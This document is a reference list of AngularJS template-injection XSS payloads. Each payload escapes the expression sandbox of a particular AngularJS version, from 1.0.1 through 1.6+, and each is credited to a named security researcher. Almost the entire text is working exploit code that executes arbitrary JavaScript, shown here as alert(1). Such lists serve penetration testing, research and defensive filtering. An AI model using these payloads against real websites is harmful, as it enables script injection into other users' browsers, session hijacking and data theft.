## AngularJS Template Injection based XSS

*For manual verification on a live target, use `angular.version` in your browser console*

**1.0.1 - 1.1.5** by [Mario Heiderich (Cure53)](https://twitter.com/0x6D6172696F)

```js
{{constructor.constructor('alert(1)')()}}
```

**1.2.0 - 1.2.1** by [Jan Horn (Google)](https://twitter.com/tehjh)

```js
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```

**1.2.2 - 1.2.5** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}
```

**1.2.6 - 1.2.18** by [Jan Horn (Google)](https://twitter.com/tehjh)

```js
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
```

**1.2.19 - 1.2.23** by [Mathias Karlsson](https://twitter.com/avlidienbrunn)

```js
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
```

**1.2.24 - 1.2.29** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
```

**1.3.0** by [Gábor Molnár (Google)](https://twitter.com/molnar_g)

```
{{!ready && (ready = true) && (
      !call
      ? $$watchers[0].get(toString.constructor.prototype)
      : (a = apply) &&
        (apply = constructor) &&
        (valueOf = call) &&
        (''+''.toString(
          'F = Function.prototype;' +
          'F.apply = F.a;' +
          'delete F.a;' +
          'delete F.valueOf;' +
          'alert(1);'
        ))
    );}}
```

**1.3.1 - 1.3.2** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{
    {}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
    'a'.constructor.prototype.charAt=''.valueOf; 
    $eval('x=alert(1)//'); 
}}
```

**1.3.3 - 1.3.18** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join; 

  'a'.constructor.prototype.charAt=[].join;
  $eval('x=alert(1)//');  }}
```

**1.3.19** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{
    'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join; 
    $eval('x=alert(1)//'); 
}}

```

**1.3.20** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```

**1.4.0 - 1.4.9** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```

**1.5.0 - 1.5.8** by [Ian Hickey](https://twitter.com/ianhickey1024)

```js
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
```

**1.5.9 - 1.5.11** by [Jan Horn (Google)](https://twitter.com/tehjh)

```js
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("
    astNode=pop();astNode.type='UnaryExpression';
    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
    astNode.argument={type:'Identifier',name:'foo'};
    ");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}
```

**1.6.0+** (no [Expression Sandbox](http://angularjs.blogspot.co.uk/2016/09/angular-16-expression-sandbox-removal.html)) by [Mario Heiderich (Cure53)](https://twitter.com/0x6D6172696F)

```js
{{constructor.constructor('alert(1)')()}}
```

